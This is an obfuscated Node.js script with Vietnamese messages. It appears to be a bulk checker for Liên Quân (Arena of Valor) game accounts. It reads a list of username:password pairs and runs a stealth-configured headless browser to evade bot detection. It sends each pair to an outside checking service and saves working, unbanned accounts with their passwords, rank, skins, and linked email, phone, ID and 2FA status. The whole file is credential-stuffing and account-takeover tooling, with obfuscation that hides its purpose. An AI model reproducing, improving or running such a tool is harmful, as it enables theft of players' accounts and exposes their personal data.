const _0x18c922=_0x5c99;function _0x1111(){const _0x3b8e76=['\x6b\x53\x53\x4c\x52','\x52\x41\x4c\x69\x57','\x61\x70\x6f\x78\x2e\x63\x6f\x6d\x2f\x63','\x63\x72\x6c\x66\x44\x65\x6c\x61\x79','\x69\x6e\x2d\x73\x74\x65\x61\x6c\x74\x68','\x6a\x51\x6c\x56\x4a','\x35\x34\x33\x31\x32\x36\x35\x51\x47\x6b\x4c\x52\x6a','\x61\x70\x70\x6c\x79','\x42\x6c\x6a\x55\x47','\x6c\x50\x64\x7a\x7a','\x68\x51\x6c\x6e\x4d','\x32\x34\x52\x59\x4e\x58\x48\x6f','\x59\x6a\x76\x6e\x6e','\x71\x4d\x79\x69\x53','\x73\x74\x72\x69\x6e\x67','\x59\x66\x59\x50\x6f','\x75\x73\x65','\x74\x6f\x53\x74\x72\x69\x6e\x67','\x6f\x67\x72\x6e\x65','\x73\x74\x64\x69\x6e','\x65\x6e\x63\x6f\x64\x69\x6e\x67','\x4b\x68\u00f4\x6e\x67\x20\x63\u00f3','\x56\x63\x78\x42\x52','\x66\x69\x6c\x74\x65\x72\x42\x61\x6e\x6e','\x79\x46\x6c\x41\x55','\x70\x75\x70\x70\x65\x74\x65\x65\x72\x2d','\x73\x70\x6c\x69\x74','\x75\x74\x66\x2d\x38','\x5a\x75\x5a\x4f\x4b','\x66\x69\x6c\x74\x65\x72\x53\x65\x6e\x64','\x6c\x6d\x6f\x4e\x4f','\x72\x66\x61\x63\x65','\x71\x75\x65\x73\x74\x69\x6f\x6e','\x4e\x59\x50\x64\x41','\x47\x6f\x6d\x46\x56','\x38\x39\x30\x32\x39\x35\x4c\x73\x61\x53\x64\x73','\x43\x45\x77\x72\x61','\x31\x30\x34\x39\x32\x39\x52\x6e\x47\x67\x55\x48','\x38\x39\x34\x37\x33\x30\x35\x67\x4d\x4a\x56\x68\x74','\x20\x2d\x20','\x34\x35\x30\x35\x31\x30\x59\x68\x64\x51\x6f\x57','\x63\x72\x65\x61\x74\x65\x49\x6e\x74\x65','\x42\x74\x48\x78\x4d','\x68\x65\x67\x41\x63','\x65\x64\x43\x68\x65\x63\x6b\x62\x6f\x78','\x28\x28\x28\x2e\x2b\x29\x2b\x29\x2b\x29','\x47\x52\x7a\x6d\x6e','\x57\x68\x5a\x4f\x46','\x4e\x2f\x41','\x54\x51\x4f\x67\x48','\x32\x36\x44\x53\x57\x4e\x57\x57','\x74\x6f\x55\x70\x70\x65\x72\x43\x61\x73','\x32\x35\x31\x30\x6b\x5a\x41\x45\x66\x42','\x34\x53\x4f\x75\x4e\x53\x77','\x78\x72\x6e\x54\x77','\x45\x76\x54\x67\x79','\x77\x4c\x65\x6b\x6f','\x6c\x69\x6e\x65','\x56\x6c\x64\x72\x76','\x36\x33\x30\x33\x34\x69\x72\x73\x68\x4d\x7a','\x6c\x65\x6e\x67\x74\x68','\x63\x72\x65\x61\x74\x65\x52\x65\x61\x64','\x73\x65\x61\x72\x63\x68','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x69\x70','\x74\x72\x69\x6d','\x68\x65\x63\x6b\x6c\x69\x71\x75\x69\x73','\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f','\x4c\x43\x42\x77\x79','\x70\x2d\x6c\x69\x6d\x69\x74','\x58\x54\x6e\x44\x51','\x54\x6e\x56\x55\x6e','\x31\x39\x39\x38\x34\x35\x36\x54\x72\x7a\x61\x57\x51','\x74\x65\x6c\x65\x67\x72\x61\x6d\x43\x68','\x61\x74\x49\x64','\x69\x6e\x70\x75\x74'];_0x1111=function(){return _0x3b8e76;};return _0x1111();}(function(_0x3dcd5f,_0x30f114){const _0x53f942=_0x5c99,_0x315afb=_0x3dcd5f();while(!![]){try{const _0x1eea7a=parseInt(_0x53f942(0x103))/(-0x125*-0x15+0x98e*0x4+-0xf9*0x40)*(-parseInt(_0x53f942(0x10c))/(0x1*-0x14f3+-0x1c1*-0x4+0xdf1))+parseInt(_0x53f942(0xf9))/(0x1b93+-0x11*-0xe6+0x2ad6*-0x1)*(-parseInt(_0x53f942(0x106))/(0x687+0x26a7+-0x2d2a))+-parseInt(_0x53f942(0x122))/(0x137f+-0xe00+-0x57a)+-parseInt(_0x53f942(0x118))/(-0x171c+-0x31*0x31+0x2083)+parseInt(_0x53f942(0xf4))/(-0x5b5+0x1*0x1b7+0x405)*(-parseInt(_0x53f942(0x127))/(0x2358+-0x350+-0x20*0x100))+parseInt(_0x53f942(0xf7))/(-0x1593+0x1*0xa1b+0xb81*0x1)+-parseInt(_0x53f942(0x105))/(-0x296*-0xb+-0x55b+-0x170d)*(-parseInt(_0x53f942(0xf6))/(-0xb8d*0x2+-0x2688+0x3dad));if(_0x1eea7a===_0x30f114)break;else _0x315afb['push'](_0x315afb['shift']());}catch(_0x64f200){_0x315afb['push'](_0x315afb['shift']());}}}(_0x1111,0x1*-0x56a98+0x1*-0xb89c9+0x1a6233));const _0x4b4390=(function(){const _0x1ba146=_0x5c99,_0x21343b={};_0x21343b[_0x1ba146(0x121)]=function(_0x3475a3,_0x122e51){return _0x3475a3===_0x122e51;},_0x21343b[_0x1ba146(0x129)]=_0x1ba146(0x114),_0x21343b[_0x1ba146(0x10b)]=function(_0x573abd,_0x1676bf){return _0x573abd!==_0x1676bf;},_0x21343b[_0x1ba146(0xed)]=_0x1ba146(0x124),_0x21343b[_0x1ba146(0xff)]='\x6d\x62\x77\x79\x54';const _0x50a776=_0x21343b;let _0x4a5db0=!![];return function(_0x566b58,_0xfa344b){const _0x3fd94e=_0x1ba146;if(_0x3fd94e(0xef)!==_0x50a776['\x47\x52\x7a\x6d\x6e']){const _0x94f93c=_0x4a5db0?function(){const _0x29eb94=_0x3fd94e;if(_0x50a776['\x6a\x51\x6c\x56\x4a'](_0x50a776[_0x29eb94(0x129)],_0x29eb94(0x114))){if(_0xfa344b){if(_0x50a776['\x56\x6c\x64\x72\x76'](_0x50a776[_0x29eb94(0xed)],_0x29eb94(0x124)))_0x577138.error(`■ Lỗi xử lý chính không mong muốn: ${_0x6d9599.message}`);else{const _0x104bc7=_0xfa344b['\x61\x70\x70\x6c\x79'](_0x566b58,arguments);return _0xfa344b=null,_0x104bc7;}}}else _0x4eeb11[_0x29eb94(0x111)]()&&_0x5e51e6++;}:function(){};return _0x4a5db0=![],_0x94f93c;}else _0x5e1cd4();};}()),_0x3a6fed=_0x4b4390(this,function(){const _0x38eab7=_0x5c99,_0x403c28={};_0x403c28['\x45\x4c\x55\x71\x43']=_0x38eab7(0xfe)+'\x2b\x24';const _0xa586d9=_0x403c28;return _0x3a6fed[_0x38eab7(0x12d)]()[_0x38eab7(0x10f)](_0xa586d9['\x45\x4c\x55\x71\x43'])[_0x38eab7(0x12d)]()[_0x38eab7(0x113)+'\x72'](_0x3a6fed)[_0x38eab7(0x10f)](_0x38eab7(0xfe)+'\x2b\x24');});_0x3a6fed();const puppeteer=require('\x70\x75\x70\x70\x65\x74\x65\x65\x72\x2d'+'\x65\x78\x74\x72\x61'),StealthPlugin=require(_0x18c922(0xea)+'\x65\x78\x74\x72\x61\x2d\x70\x6c\x75\x67'+_0x18c922(0x120)),fs=require('\x66\x73'),path=require('\x70\x61\x74\x68'),readline=require('\x72\x65\x61\x64\x6c\x69\x6e\x65'),pLimitModule=require(_0x18c922(0x115)),pLimit=pLimitModule['\x64\x65\x66\x61\x75\x6c\x74']||pLimitModule;puppeteer[_0x18c922(0x12c)](StealthPlugin());const URL_CHECK=_0x18c922(0x110)+_0x18c922(0x11e)+_0x18c922(0x112)+'\x75\x6e\x2e\x70\x68\x70',BASE_URL=_0x18c922(0x110)+'\x61\x70\x6f\x78\x2e\x63\x6f\x6d\x2f',INPUT_FILE='\x6c\x69\x65\x6e\x71\x75\x61\x6e\x2e\x74'+'\x78\x74',OUTPUT_FILE='\x6c\x69\x65\x6e\x71\x75\x61\x6e\x6c\x69'+'\x76\x65\x2e\x74\x78\x74',_0x2327ef={};_0x2327ef[_0x18c922(0x119)+_0x18c922(0x11a)]='',_0x2327ef[_0x18c922(0xee)]='\x30',_0x2327ef[_0x18c922(0xe8)+_0x18c922(0xfd)]='\x31',_0x2327ef['\x66\x69\x6c\x74\x65\x72\x53\x65\x6e\x64'+'\x73\x6b\x69\x6e']='\x30';function _0x5c99(_0x5c9945,_0x47b1b2){const _0x1aeffb=_0x1111();return _0x5c99=function(_0x294260,_0x7065bd){_0x294260=_0x294260-(0xeb+0x6d*0x4d+-0x20d1);let _0x5f395a=_0x1aeffb[_0x294260];return _0x5f395a;},_0x5c99(_0x5c9945,_0x47b1b2);}const STATIC_DATA_SUBSET=_0x2327ef,translateYesNo=_0x4bf838=>{const _0x1d60da=_0x18c922,_0x502634={};_0x502634['\x68\x65\x67\x41\x63']='\x59\x45\x53',_0x502634[_0x1d60da(0x125)]=function(_0x36934c,_0x1d299b){return _0x36934c===_0x1d299b;},_0x502634[_0x1d60da(0x100)]='\x4b\x68\u00f4\x6e\x67',_0x502634['\x77\x4c\x65\x6b\x6f']=function(_0x33b4b8,_0x11a333){return _0x33b4b8??_0x11a333;},_0x502634[_0x1d60da(0x108)]=_0x1d60da(0x101);const _0x42406a=_0x502634,_0x52424f=_0x4bf838?.[_0x1d60da(0x104)+'\x65']();if(_0x52424f===_0x42406a[_0x1d60da(0xfc)])return'\x43\u00f3';if(_0x42406a[_0x1d60da(0x125)](_0x52424f,'\x4e\x4f'))return _0x42406a[_0x1d60da(0x100)];return _0x42406a[_0x1d60da(0x109)](_0x4bf838,_0x42406a[_0x1d60da(0x108)]);},formatDateTime=_0x2ee1e8=>{const _0x33c82a=_0x18c922,_0x43098d={'\x58\x54\x6e\x44\x51':function(_0x2cd77d,_0xe43b9a){return _0x2cd77d!==_0xe43b9a;},'\x68\x51\x6c\x6e\x4d':_0x33c82a(0x12a),'\x42\x74\x48\x78\x4d':_0x33c82a(0x101),'\x57\x6e\x6b\x43\x68':function(_0x4cd1e8,_0x1732bc){return _0x4cd1e8!==_0x1732bc;},'\x52\x41\x4c\x69\x57':function(_0x1e94d1,_0x38ca8b){return _0x1e94d1(_0x38ca8b);},'\x51\x4f\x68\x70\x61':function(_0x3b6162,_0x5c942b){return _0x3b6162(_0x5c942b);}};if(!_0x2ee1e8||_0x43098d[_0x33c82a(0x116)](typeof _0x2ee1e8,_0x43098d[_0x33c82a(0x126)]))return _0x43098d[_0x33c82a(0xfb)];const _0x199351=_0x2ee1e8[_0x33c82a(0xeb)]('\x20');if(_0x43098d['\x57\x6e\x6b\x43\x68'](_0x199351[_0x33c82a(0x10d)],0x1*0x70a+0xb*-0x122+0xa*0x8b))return _0x2ee1e8;const _0x409c71=_0x199351[-0x2576+-0x6d0+0x2c46],_0x56d915=_0x199351[0x17fe+-0x176e+0xd*-0xb][_0x33c82a(0xeb)]('\x2d');if(_0x43098d[_0x33c82a(0x116)](_0x56d915[_0x33c82a(0x10d)],0x239e+0x16a5+-0x3a40)||_0x43098d[_0x33c82a(0x11d)](isNaN,_0x43098d[_0x33c82a(0x11d)](parseInt,_0x56d915[0xd6a+-0x2633+-0x1b*-0xeb]))||_0x43098d[_0x33c82a(0x11d)](isNaN,_0x43098d['\x51\x4f\x68\x70\x61'](parseInt,_0x56d915[-0x1008+0xe5+-0x39*-0x44]))||_0x43098d[_0x33c82a(0x11d)](isNaN,parseInt(_0x56d915[-0x1*-0x1fdc+0xbfc+-0x1*0x2bd6])))return _0x2ee1e8;return _0x409c71+_0x33c82a(0xf8)+_0x56d915[0x64b+-0x1a1d+0x13d2]+'\x2f'+_0x56d915[0x5d0+-0x195e+0x138f]+'\x2f'+_0x56d915[-0x22a8+-0x1d4b+0x3ff5];},formatSkinList=(_0x1911f1,_0x565d64)=>{const _0x18739b=_0x18c922,_0x2e5fa3={};_0x2e5fa3[_0x18739b(0x102)]=function(_0x3bbf09,_0x17006a){return _0x3bbf09===_0x17006a;},_0x2e5fa3['\x4e\x59\x50\x64\x41']=function(_0x45705f,_0x5abcda){return _0x45705f!==_0x5abcda;},_0x2e5fa3['\x51\x52\x71\x72\x63']='\x51\x4a\x70\x71\x6e',_0x2e5fa3[_0x18739b(0xe7)]=_0x18739b(0x117),_0x2e5fa3[_0x18739b(0xe9)]=_0x18739b(0xe6);const _0xdfa587=_0x2e5fa3;if(!_0x1911f1||_0xdfa587['\x54\x51\x4f\x67\x48'](_0x1911f1[_0x18739b(0x104)+'\x65'](),_0x565d64?.[_0x18739b(0x104)+'\x65']()))return _0xdfa587[_0x18739b(0xf2)](_0xdfa587['\x51\x52\x71\x72\x63'],_0xdfa587[_0x18739b(0xe7)])?_0xdfa587['\x79\x46\x6c\x41\x55']:{status:'json_error'};return _0x1911f1;},askQuestion=_0x27e9c3=>{const _0x4a501c=_0x18c922,_0x785692={'\x78\x72\x6e\x54\x77':function(_0xb2897f,_0x1178a4){return _0xb2897f(_0x1178a4);}},_0x404357={};_0x404357[_0x4a501c(0x11b)]=process[_0x4a501c(0xe4)],_0x404357['\x6f\x75\x74\x70\x75\x74']=process['\x73\x74\x64\x6f\x75\x74'];const _0x36e242=readline['\x63\x72\x65\x61\x74\x65\x49\x6e\x74\x65'+_0x4a501c(0xf0)](_0x404357);return new Promise(_0x586cd9=>_0x36e242[_0x4a501c(0xf1)](_0x27e9c3,_0xf9682f=>{const _0xc69344=_0x4a501c;_0x36e242['\x63\x6c\x6f\x73\x65'](),_0x785692[_0xc69344(0x107)](_0x586cd9,_0xf9682f);}));},countLines=_0x47a24d=>{const _0x3edf51=_0x18c922,_0x39dd43={'\x43\x45\x77\x72\x61':function(_0x5446ee,_0x4e5b3f){return _0x5446ee(_0x4e5b3f);},'\x59\x6a\x76\x6e\x6e':_0x3edf51(0xec),'\x6b\x53\x53\x4c\x52':_0x3edf51(0x10a),'\x59\x66\x59\x50\x6f':'\x65\x72\x72\x6f\x72'};return new Promise((_0x418364,_0x4631be)=>{const _0x33dfb9=_0x3edf51,_0x58567c={'\x6f\x67\x72\x6e\x65':_0x33dfb9(0xf3),'\x6c\x74\x53\x63\x6a':function(_0x172eb5,_0xd2f596){return _0x172eb5(_0xd2f596);}};let _0x100e7b=-0x5*-0x6bf+-0x2f7+-0x1ec4;const _0x33dc30={};_0x33dc30[_0x33dfb9(0xe5)]=_0x39dd43[_0x33dfb9(0x128)];const _0x3bbeae=fs[_0x33dfb9(0x10e)+'\x53\x74\x72\x65\x61\x6d'](_0x47a24d,_0x33dc30),_0x4bd55a={};_0x4bd55a[_0x33dfb9(0x11b)]=_0x3bbeae,_0x4bd55a[_0x33dfb9(0x11f)]=Infinity;const _0x5b881d=readline[_0x33dfb9(0xfa)+_0x33dfb9(0xf0)](_0x4bd55a);_0x5b881d['\x6f\x6e'](_0x39dd43[_0x33dfb9(0x11c)],_0x19305=>{const _0x238eca=_0x33dfb9;if(_0x58567c[_0x238eca(0xe3)]!==_0x58567c[_0x238eca(0xe3)]){const _0x5cd7ea=_0x5674fa?function(){const _0x3f21be=_0x238eca;if(_0x32c4eb){const _0x1cb903=_0x2ba9bd[_0x3f21be(0x123)](_0x58441b,arguments);return _0x560009=null,_0x1cb903;}}:function(){};return _0x3db9c6=![],_0x5cd7ea;}else _0x19305[_0x238eca(0x111)]()&&_0x100e7b++;}),_0x5b881d['\x6f\x6e']('\x63\x6c\x6f\x73\x65',()=>{_0x58567c['\x6c\x74\x53\x63\x6a'](_0x418364,_0x100e7b);}),_0x5b881d['\x6f\x6e'](_0x39dd43[_0x33dfb9(0x12b)],_0x563653=>{_0x58567c['\x6c\x74\x53\x63\x6a'](_0x4631be,_0x563653);}),_0x3bbeae['\x6f\x6e'](_0x39dd43[_0x33dfb9(0x12b)],_0x2f4202=>{const _0x5d67e3=_0x33dfb9;_0x39dd43[_0x5d67e3(0xf5)](_0x4631be,_0x2f4202);});});};const processAccount=async(pageInstance,account_line,index,total,key,uniqueSet)=>{const parts=account_line.split(/[:|]/,2);if(parts.length!==2||!parts[0]||!parts[1]){console.log(`■ [${index+1}/${total}] Tài khoản không hợp lệ: ${account_line}`);return;}const username=parts[0].trim();const password=parts[1].trim();const result=await pageInstance.evaluate(async(url,staticDataSubset,user,pass,keyFromUser)=>{const bodyParams=new URLSearchParams({...staticDataSubset,key:keyFromUser,account:user,password:pass});try{const response=await fetch(url,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','Accept':'application/json, text/javascript, */*; q=0.01','X-Requested-With':'XMLHttpRequest'},body:bodyParams.toString()});if(!response.ok){return{status:'http_error',code:response.status};}const text=await response.text();try{return JSON.parse(text);}catch(jsonError){return{status:'json_error'};}}catch(fetchError){return{status:'fetch_error',message:fetchError.message};}},URL_CHECK,STATIC_DATA_SUBSET,username,password,key);if(result.status==='success'&&result.data){const data=result.data;const original_band_status=data.band?.toUpperCase()??'YES';if(original_band_status==='NO'){if(!uniqueSet.has(username)){const logSkinSSValue=formatSkinList(data.listskinss,'NO SS');const logSkinSSSValue=formatSkinList(data.listskinsss,'NO SSS');const logSkinAnimeValue=formatSkinList(data.listskinanime,'NO Anime');console.log(`■ [${index+1}/${total}] Thông tin tài khoản ${username}`);console.log(`■ Skin: ${data.skin??'N/A'}`);console.log(`■ Tướng: ${data.tuong??'N/A'}`);console.log(`■ Skin SS (${data.ss??'N/A'})`+(logSkinSSValue==='Không có'?'':`: ${logSkinSSValue}`));console.log(`■ Skin SSS (${data.sss??'N/A'})`+(logSkinSSSValue==='Không có'?'':`: ${logSkinSSSValue}`));console.log(`■ Skin Anime (${data.anime??'N/A'})`+(logSkinAnimeValue==='Không có'?'':`: ${logSkinAnimeValue}`));console.log();let fileFb=data.fb??'N/A';const upperFb=data.fb?.toUpperCase();if(upperFb==='LIVE'){fileFb='Hoạt động';}else if(upperFb==='NO'){fileFb='Không';}else if(upperFb==='DIE'){fileFb='Không hoạt động';}let fileTtemail=data.ttemail??'N/A';const upperTtemail=data.ttemail?.toUpperCase();if(upperTtemail==='CHƯA XÁC THỰC'){fileTtemail='Không';}else if(upperTtemail==='ĐÃ XÁC THỰC'){fileTtemail='Có';}let fileName=data.name??'N/A';if(data.name?.toUpperCase()==='KHÔNG TỒN TẠI'){fileName='Không có';}const fileLsnap=translateYesNo(data.lsnap);const fileCmnd=translateYesNo(data.cmnd);const fileEmail=translateYesNo(data.email);const fileAuthen=translateYesNo(data.authen);const fileSdt=translateYesNo(data.sdt);const fileBand=translateYesNo(data.band);const fileTt=data.tt?.toUpperCase()==='ACC FULL'?'Đầy đủ thông tin':data.tt??'N/A';const fileLslogin=formatDateTime(data.lslogin);let fileTimeregacc=formatDateTime(data.timeregacc);if(data.timeregacc?.toUpperCase()==='KHÔNG XÁC ĐỊNH'){fileTimeregacc='Không xác định';}const fileListSkinSSValue=formatSkinList(data.listskinss,'NO SS');const fileListSkinSSSValue=formatSkinList(data.listskinsss,'NO SSS');const fileListSkinAnimeValue=formatSkinList(data.listskinanime,'NO Anime');const skinSSPart=`Skin SS (${data.ss??'N/A'})`+(fileListSkinSSValue==='Không có'?'':`: ${fileListSkinSSValue}`);const skinSSSPart=`Skin SSS (${data.sss??'N/A'})`+(fileListSkinSSSValue==='Không có'?'':`: ${fileListSkinSSSValue}`);const skinAnimePart=`Skin Anime (${data.anime??'N/A'})`+(fileListSkinAnimeValue==='Không có'?'':`: ${fileListSkinAnimeValue}`);const output_line=`Tài khoản: ${data.username??'N/A'} | `+`Mật khẩu: ${data.password??'N/A'} | `+`Tên nick: ${fileName} | `+`Cấp độ: ${data.level??'N/A'} | `+`Bậc: ${data.rank??'N/A'} | `+`Quân Huy: ${data.qh??'N/A'} | `+`Đã nạp: ${fileLsnap} | `+`Sò: ${data.so??'N/A'} | `+`Quốc gia: ${data.acc_country??'N/A'} | `+`Lịch sử đăng nhập: ${fileLslogin} | `+`Skin: ${data.skin??'N/A'} | `+`Tướng: ${data.tuong??'N/A'} | `+`CCCD: ${fileCmnd} | `+`Email: ${fileEmail} | `+`Xác thực: ${fileTtemail} | `+`2FA: ${fileAuthen} | `+`Số điện thoại: ${fileSdt} | `+`Facebook: ${fileFb} | `+`Thời gian tạo tài khoản: ${fileTimeregacc} | `+`${skinSSPart} | `+`${skinSSSPart} | `+`${skinAnimePart}\n`;fs.appendFileSync(OUTPUT_FILE,output_line,'utf-8');uniqueSet.add(username);}}}};((async()=>{if(!fs.existsSync(INPUT_FILE)){console.log(`■ File ${INPUT_FILE} không tồn tại, đang tạo file mẫu.`);try{fs.writeFileSync(INPUT_FILE,'username_mau1:password_mau1\nusername_mau2|password_mau2\n','utf-8');console.log(`■ Đã tạo file ${INPUT_FILE} với nội dung mẫu (dùng : hoặc |), vui lòng chỉnh sửa file này.`);}catch(e){console.log(`■ Không thể tạo file ${INPUT_FILE}: ${e.message}`);}return;}let total_accounts=0;total_accounts=await countLines(INPUT_FILE);if(total_accounts===0){console.log(`■ File ${INPUT_FILE} trống hoặc không chứa dữ liệu hợp lệ.`);return;}const userKey=await askQuestion('\u25A0 Key đã mua: ');if(!userKey){console.log('\u25A0 Key không được để trống, đã dừng chương trình.');return;}let concurrencyValue=1;const concurrencyInput=await askQuestion('\u25A0 Số luồng cần chạy (tối đa 3): ');const parsedConcurrency=parseInt(concurrencyInput,10);if(!isNaN(parsedConcurrency)&&parsedConcurrency>0){if(parsedConcurrency>3){console.log('\u25A0 Số luồng vượt quá 3, sử dụng mặc định là 3.');concurrencyValue=3;}else{concurrencyValue=parsedConcurrency;}}else if(concurrencyInput.trim()!==''){console.log('\u25A0 Số luồng không hợp lệ, sử dụng mặc định là 1.');}console.log(`■ Bắt đầu kiểm tra ${total_accounts} tài khoản từ ${INPUT_FILE} với ${concurrencyValue} luồng.`);console.log();let browser=null;let page=null;const writtenUsernames=new Set();const limit=pLimit(concurrencyValue);let lineIndex=0;let activeTasks=0;let readingFinished=false;let allTasksDoneResolver;const allTasksDonePromise=new Promise(resolve=>{allTasksDoneResolver=resolve;});try{browser=await puppeteer.launch({headless:true,args:['--no-sandbox','--disable-setuid-sandbox','--disable-dev-shm-usage','--disable-accelerated-2d-canvas','--no-first-run','--no-zygote','--disable-gpu']});page=await browser.newPage();await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36');await page.setViewport({width:1280,height:800});try{await page.goto(BASE_URL,{waitUntil:'networkidle2'});}catch(navError){if(browser)await browser.close();return;}const fileStream=fs.createReadStream(INPUT_FILE,{encoding:'utf-8'});const rl=readline.createInterface({input:fileStream,crlfDelay:Infinity});rl.on('line',line=>{const account_line=line.trim();if(!account_line)return;const currentLineIndex=lineIndex++;activeTasks++;limit(async()=>{const taskPromise=processAccount(page,account_line,currentLineIndex,total_accounts,userKey,writtenUsernames);return taskPromise.finally(()=>{activeTasks--;if(readingFinished&&activeTasks===0){allTasksDoneResolver();}});});});rl.on('close',()=>{readingFinished=true;if(activeTasks===0){allTasksDoneResolver();}});rl.on('error',async err=>{console.error(`■ Lỗi khi đọc file ${INPUT_FILE}: ${err.message}`);readingFinished=true;if(browser){try{await browser.close();}catch(e){}}allTasksDoneResolver();});await allTasksDonePromise;}catch(error){console.error(`■ Lỗi xử lý chính không mong muốn: ${error.message}`);}finally{if(page){try{await page.close();}catch(e){}}if(browser){try{await browser.close();}catch(e){}}console.log('\n\u25A0 Kiểm tra hoàn tất.');}})());